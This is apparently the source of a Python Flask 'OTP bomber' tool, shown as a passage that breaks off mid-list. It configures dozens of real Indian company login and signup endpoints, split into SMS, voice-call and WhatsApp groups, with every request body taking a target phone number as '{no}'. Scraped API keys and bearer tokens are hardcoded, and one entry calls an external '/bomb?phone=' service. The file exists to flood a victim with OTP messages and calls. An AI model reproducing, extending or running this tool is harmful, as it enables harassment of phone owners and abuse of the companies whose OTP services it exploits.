from flask import Flask, request, jsonify
import requests
import concurrent.futures
import time
import json
import random

app = Flask(__name__)

# ============================================================
# 📋 SMS APIS - 9 APIs
# ============================================================

SMS_APIS = [
    {
        "name": "Astroyogi_V3_SMS",
        "url": "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0NDE0ODc0LCJleHAiOjE3OTIxOTA4NzR9.",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        "body_type": "json",
        "body": {"PhoneNumber": "{no}", "PhoneCode": "91", "Domain": "Web", "CountryId": "IN", "IpAddress": "2409:40e4:1143:e495:8000::", "CountryCodeByHeader": "IN"},
        "type": "SMS"
    },
    {
        "name": "Astroyogi_Old_SMS",
        "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0MjE1MTc3LCJleHAiOjE3OTE5OTExNzd9",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        "body_type": "json",
        "body": {"phoneCode": "91", "countryCode": "IN", "mobileNumber": "{no}", "platform": "Web", "IpAddress": "2309:49e4:2231:b058:1000::", "requestType": "sms", "countryCodeByHeader": "IN"},
        "type": "SMS"
    },
    {
        "name": "Hotstar_SMS",
        "url": "https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8",
        "method": "POST",
        "params": {"action": "resendOtp"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-hs-client": "platform:mweb;app_version:26.07.22.0",
            "x-hs-platform": "mweb",
            "x-country-code": "in",
            "x-hs-device-id": "800cef-9800a2-82cb1c-160713",
            "x-hs-app": "260722000",
            "origin": "https://www.hotstar.com",
            "referer": "https://www.hotstar.com/in/onboarding?ref=%2Fin"
        },
        "body_type": "json",
        "body": {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "phone_number": "{no}", "initiate_by": 1, "recaptcha_token": "", "source": 0}},
        "type": "SMS"
    },
    {
        "name": "Zomato_SMS",
        "url": "https://accounts.zomato.com/login/phone",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        "body_type": "form",
        "body": {"number": "{no}", "country_id": "1", "lc": "bed7238d427f41e7a34ea6ea134d2628", "type": "initiate", "verification_type": "sms", "package_name": "", "message_uuid": "sms-service-v2-12cf2bdc-7cd9-4e1a-9cd1-6470f83d56f0"},
        "type": "SMS"
    },
    {
        "name": "1mg_SMS",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {
            "Accept": "application/vnd.healthkartplus.v11+json",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        "body_type": "json",
        "body": {"number": "{no}", "is_corporate_user": False, "otp_on_call": False},
        "type": "SMS"
    },
    {
        "name": "SmartCoin_SMS",
        "url": "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        "body_type": "json",
        "body": {"phone_number": "{no}", "app_version": "100101", "channel": "SMS", "request_type": "REGISTRATION", "onboarding_consent": True},
        "type": "SMS"
    },
    {
        "name": "TataCapital_SMS",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        "body_type": "json",
        "body": {"phone": "{no}", "applSource": "", "isOtpViaCall": "false"},
        "type": "SMS"
    },
    {
        "name": "RummyCircle_SMS",
        "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15"
        },
        "body_type": "json",
        "body": {"otpOnCall": False, "mobile": "{no}", "otpType": 8.0, "transactionId": 1708139023656},
        "type": "SMS"
    },
    {
        "name": "DamieCloud_SMS",
        "url": "https://damiecloud.online/send/{no}",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36",
            "Accept": "*/*"
        },
        "body_type": "none",
        "body": {},
        "type": "SMS"
    }
]

# ============================================================
# 📞 CALL APIS
# ============================================================

CALL_APIS = [
    {
        "name": "Zomato_Call",
        "url": "https://accounts.zomato.com/login/phone",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        "body_type": "form",
        "body": {"number": "{no}", "country_id": "1", "lc": "bed7238d427f41e7a34ea6ea134d2628", "type": "initiate", "verification_type": "call", "package_name": "", "message_uuid": "sms-service-v2-12cf2bdc-7cd9-4e1a-9cd1-6470f83d56f0"},
        "type": "CALL"
    },
    {
        "name": "Refyne_Call",
        "url": "https://prod-api.refyne.co.in/auth/v2/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        "body_type": "json",
        "body": {"channel": "IVR", "recipient": "{no}"},
        "type": "CALL"
    },
    {
        "name": "SmartCoin_Call",
        "url": "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        "body_type": "json",
        "body": {"phone_number": "{no}", "app_version": "100101", "channel": "IVR", "request_type": "REGISTRATION", "onboarding_consent": True},
        "type": "CALL"
    },
    {
        "name": "1mg_Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {
            "Accept": "application/vnd.healthkartplus.v11+json",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        "body_type": "json",
        "body": {"number": "{no}", "is_corporate_user": False, "otp_on_call": True},
        "type": "CALL"
    },
    {
        "name": "TataCapital_Voice",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        "body_type": "json",
        "body": {"phone": "{no}", "applSource": "", "isOtpViaCallAtLogin": "true"},
        "type": "CALL"
    },
    {
        "name": "Astrosage_Call",
        "url": "http://varta.astrosage.com/sdk/send-otp-via-call",
        "method": "GET",
        "params": {"callback": "myCallback", "countrycode": "91", "phoneno": "{no}", "deviceid": "", "operation_name": "blank", "jsonpcall": "1", "fromresend": "0", "_": "0"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/"
        },
        "body_type": "none",
        "body": {},
        "type": "CALL"
    },
    {
        "name": "RummyCircle_Call",
        "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15"
        },
        "body_type": "json",
        "body": {"otpOnCall": True, "mobile": "{no}", "otpType": 8.0, "transactionId": 1708139023656},
        "type": "CALL"
    }
]

# ============================================================
# 💬 WHATSAPP SECTION 1 (with proper body key, not data/lambda)
# ============================================================

WHATSAPP_SECTION_1 = [
    {
        "name": "Splexxo",
        "url": "https://splexxo1-2api.vercel.app/bomb?phone={no}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "body": {},
        "type": "WHATSAPP"
    },
    {
        "name": "AgriEvolution",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": {"mobile_number": "{no}", "client_id": "kisan-app"},
        "type": "WHATSAPP"
    },
    {
        "name": "Breeze",
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"},
        "body": {"phoneNumber": "{no}", "authVerificationType": "otp", "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"}, "countryCode": "+91"},
        "type": "WHATSAPP"
    },
    {
        "name": "Jockey",
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{no}?whatsapp=true",
        "method": "GET",
        "headers": {"accept": "*/*", "user-agent": "Mozilla/5.0", "origin": "https://www.jockey.in"},
        "body": {},
        "type": "WHATSAPP"
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y"},
        "body": {"phone": "{no}", "country": "IN"},
        "type": "WHATSAPP"
    },
    {
        "name": "Redcliffe",
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"phone_number": "{no}", "short": True, "country_code": "+91"},
        "type": "WHATSAPP"
    },
    {
        "name": "PW Live",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9"},
        "body": {"mobile": "{no}", "organizationId": "5eb393ee95fab7468a79d189"},
        "type": "WHATSAPP"
    },
    {
        "name": "CityMall",
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
        "body": {"phone_number": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Licious",
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
        "body": {"phone": "{no}", "captcha_token": None},
        "type": "WHATSAPP"
    },
    {
        "name": "Bisleri",
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
        "body": {"email": "user1234@gmail.com", "mobile": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "OYO",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "text/plain;charset=UTF-8", "Cookie": "user_id=none; country_code=IN;"},
        "body": {"phone": "{no}", "country_code": "+91", "nod": 4},
        "type": "WHATSAPP"
    },
    {
        "name": "BellaVita",
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={no}",
        "method": "GET",
        "headers": {"Accept": "*/*"},
        "body": {},
        "type": "WHATSAPP"
    },
    {
        "name": "Zoho",
        "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{no}&countrycode=IN",
        "method": "POST",
        "headers": {"Accept": "*/*"},
        "body": {},
        "type": "WHATSAPP"
    },
    {
        "name": "KPN Fresh",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        "method": "POST",
        "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json"},
        "body": {"phone_number": {"country_code": "+91", "number": "{no}"}},
        "type": "WHATSAPP"
    },
    {
        "name": "Aditya Birla",
        "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "body": {"MobileNumber": "{no}", "functionality": "signup"},
        "type": "WHATSAPP"
    },
    {
        "name": "Muthoot",
        "url": "https://www.muthootfinance.com/smsapi.php",
        "method": "POST",
        "headers": {"content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest"},
        "body": {"mobile": "{no}", "pin": "XjtYYEdhP0haXjo3"},
        "type": "WHATSAPP"
    },
    {
        "name": "GoPaySense",
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "IIFL",
        "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        "method": "POST",
        "headers": {"content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest"},
        "body": {"apply_for": "18", "full_name": "User", "mobile_number": "{no}", "terms_and_condition": "1"},
        "type": "WHATSAPP"
    },
    {
        "name": "BankOpen",
        "url": "https://v2-api.bankopen.co/users/register/otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-api-version": "3.1"},
        "body": {"username": "{no}", "is_open_capital": 1},
        "type": "WHATSAPP"
    },
    {
        "name": "Tata Capital",
        "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": "{no}"}},
        "type": "WHATSAPP"
    },
    {
        "name": "TradeIndia",
        "url": "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"mobile": "+91{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"x-kb-app-name": "khatabook", "x-kb-app-version": "801800", "Content-Type": "application/json"},
        "body": {"phone": "{no}", "country_code": "+91", "app_signature": "wk+avHrHZf2"},
        "type": "WHATSAPP"
    },
    {
        "name": "Orange Health",
        "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"mobile_number": "{no}", "customer_auto_fetch_message": True},
        "type": "WHATSAPP"
    },
    {
        "name": "JobHai",
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1", "source": "WEB"},
        "body": {"phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "MConnect",
        "url": "https://mconnect.isteer.co/mconnect/login",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "app_platform": "mvaahna"},
        "body": {"mobile_number": "+91{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "AstroSage",
        "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={no}&jsonpcall=1",
        "method": "GET",
        "headers": {"accept": "*/*"},
        "body": {},
        "type": "WHATSAPP"
    },
    {
        "name": "Spinny",
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "platform": "web"},
        "body": {"contact_number": "{no}", "whatsapp": False, "code_len": 4},
        "type": "WHATSAPP"
    },
    {
        "name": "Dream11",
        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "device": "pwa"},
        "body": {"channel": "sms", "flow": "SIGNUP", "phoneNumber": "{no}", "templateName": "default"},
        "type": "WHATSAPP"
    },
    {
        "name": "MYMA",
        "url": "https://portal.myma.in/custom-api/auth/generateotp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"countrycode": "+91", "mobile": "91{no}", "is_otpgenerated": False, "app_version": "-1"},
        "type": "WHATSAPP"
    },
    {
        "name": "Freedo",
        "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "platform": "web", "x-channel": "WEB", "x-client-id": "FREEDO"},
        "body": {"email_id": "user1234@gmail.com", "first_name": "User", "mobile_number": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"phoneNumber": "{no}", "countryCode": "+91", "data": {"email": "user@gmail.com"}, "authScreen": "signup-screen"},
        "type": "WHATSAPP"
    },
    {
        "name": "EvitalRX",
        "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
        "body": {"pharmacy_name": "pharma", "mobile": "{no}", "email_id": "user1234@gmail.com", "zip_code": "110086"},
        "type": "WHATSAPP"
    },
    {
        "name": "QuickRide",
        "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        "method": "POST",
        "headers": {"APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded"},
        "body": {"contactNo": "{no}", "countryCode": "+91", "appName": "Quick Ride"},
        "type": "WHATSAPP"
    },
    {
        "name": "Clovia",
        "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={no}&isSignUp=true&is_otp=True",
        "method": "GET",
        "headers": {"accept": "application/json"},
        "body": {},
        "type": "WHATSAPP"
    },
    {
        "name": "KwikFix",
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Brevistay",
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "brevi-channel": "DESKTOP_WEB"},
        "body": {"is_otp": 1, "is_password": 0, "mobile": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "HourlyRooms",
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {"Accept": "*/*", "content-type": "application/json", "platform": "web-2.0.0"},
        "body": {"phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "MadrasMandi",
        "url": "https://api.madrasmandi.in/api/v1/auth/otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "multipart/form-data", "mm-device-type": "web"},
        "body": {"phone": "+91{no}", "scope": "client"},
        "type": "WHATSAPP"
    },
    {
        "name": "BharatLoan",
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "body": {"mobile": "{no}", "current_page": "login", "is_existing_customer": "2"},
        "type": "WHATSAPP"
    },
    {
        "name": "Pagarbook",
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {"accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER"},
        "body": {"phone": "{no}", "language": 1},
        "type": "WHATSAPP"
    },
    {
        "name": "Vahak",
        "url": "https://api.vahak.in/v1/u/o_w",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"phone_number": "{no}", "scope": 0, "is_whatsapp": False},
        "type": "WHATSAPP"
    },
    {
        "name": "Ixigo",
        "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {"accept": "*/*", "apikey": "ixiweb!2$", "clientid": "ixiweb", "content-type": "application/x-www-form-urlencoded"},
        "body": {"sixDigitOTP": "true", "prefix": "+91", "phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "55Club",
        "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"phone": "91{no}", "codeType": 1, "language": 0},
        "type": "WHATSAPP"
    },
    {
        "name": "Zerodha",
        "url": "https://zerodha.com/account/registration.php",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"mobile": "{no}", "source": "zerodha", "partner_id": ""},
        "type": "WHATSAPP"
    },
    {
        "name": "Aakash ANTHE",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"},
        "body": {"mobile_psid": "{no}", "mobile_number": "", "activity_type": "aakash-myadmission"},
        "type": "WHATSAPP"
    },
    {
        "name": "Testbook",
        "url": "https://api.testbook.com/api/v2/mobile/signup?mobile={no}&clientId=1117490662.1715447223",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-tb-client": "web,1.2"},
        "body": {"firstVisitSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic"}, "mobile": "{no}", "signupDetails": {"page": "HomePage"}},
        "type": "WHATSAPP"
    },
    {
        "name": "MediBuddy",
        "url": "https://loginprod.medibuddy.in/unified-login/user/register",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": "{no}", "flow": "Retail-Login-Home-Flow"},
        "type": "WHATSAPP"
    },
    {
        "name": "Beyoung",
        "url": "https://www.beyoung.in/api/sendOtp.json",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ=="},
        "body": {"username": "{no}", "username_type": "mobile", "service_type": 0},
        "type": "WHATSAPP"
    },
    {
        "name": "Wrogn",
        "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        "method": "POST",
        "headers": {"accept": "*/*", "action": "sendOTP", "content-type": "application/json", "shop_name": "wrogn-website.myshopify.com"},
        "body": {"username": "+91{no}", "type": "mobile", "domain": "wrogn.com"},
        "type": "WHATSAPP"
    },
    {
        "name": "MedKart",
        "url": "https://app.medkart.in/api/v1/auth/requestOTP",
        "method": "POST",
        "headers": {"accept": "application/json", "app-platform": "web", "content-type": "application/json"},
        "body": {"mobile_no": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "isweb": "true"},
        "body": {"mobile": "{no}", "referralCode": ""},
        "type": "WHATSAPP"
    },
    {
        "name": "Coverfox",
        "url": "https://www.coverfox.com/otp/send/",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest"},
        "body": {"contact": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "WoodenStreet",
        "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest"},
        "body": {"telephone": "{no}", "pincode": "110086", "city": "DELHI", "state": "DELHI", "email": "user@gmail.com"},
        "type": "WHATSAPP"
    },
    {
        "name": "GoMechanic",
        "url": "https://gomechanic.app/api/v2/send_otp",
        "method": "POST",
        "headers": {"Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27", "Content-Type": "application/json"},
        "body": {"number": "{no}", "source": "website", "random_id": "K6z9b"},
        "type": "WHATSAPP"
    },
    {
        "name": "LoveLocal",
        "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
        "method": "POST",
        "headers": {"accept": "application/json", "client-code": "vulpix", "content-type": "application/json"},
        "body": {"phone_number": "{no}", "role": "CUSTOMER"},
        "type": "WHATSAPP"
    },
    {
        "name": "Tyreplex",
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "body": {"perform_action": "sendOTP", "mobile_no": "{no}", "action_type": "order_login"},
        "type": "WHATSAPP"
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"email": "", "phone": "{no}", "type": "p", "source": "signup"},
        "type": "WHATSAPP"
    },
    {
        "name": "OxygenDigital",
        "url": "https://oxygendigitalshop.com/graphql",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"operationName": "sendRegistrationOtp", "variables": {"email_or_otp": "+91{no}", "isResend": False}, "query": "mutation sendRegistrationOtp($token: String!, $email_or_otp: String!, $isResend: Boolean!) { sendRegistrationOtp(token: $token, value: $email_or_otp, is_resend: $isResend) }"},
        "type": "WHATSAPP"
    },
    {
        "name": "UpGrad",
        "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        "method": "POST",
        "headers": {"accept": "application/json", "client": "web", "content-type": "application/json"},
        "body": {"phoneNumber": "+91{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "PinkNBlu",
        "url": "http://www.pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "body": {"country_code": "+91", "phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Udaan",
        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-app-id": "udaan-auth"},
        "body": {"mobile": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Xylem",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Accept": "application/json", "Authorization": "Bearer", "Content-Type": "application/json", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB"},
        "body": {"mobile": "{no}", "countryCode": "+91", "firstName": "User"},
        "type": "WHATSAPP"
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/x-www-form-urlencoded"},
        "body": {"phone": "+91{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Vidyakul",
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest"},
        "body": {"phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "WoodenStreet Register",
        "url": "https://api.woodenstreet.com/api/v1/register",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"firstname": "User", "email": "user1234@gmail.com", "telephone": "{no}", "password": "pass@123", "pincode": "110001"},
        "type": "WHATSAPP"
    },
    {
        "name": "Vedantu",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"phoneCode": "+91", "phoneNumber": "{no}", "sType": "VEDANTU_F_7_N", "version": 2, "whatsappCommunicationEnabled": False},
        "type": "WHATSAPP"
    },
    {
        "name": "Spotify",
        "url": "https://accounts.spotify.com/api/v1/login/phone",
        "method": "POST",
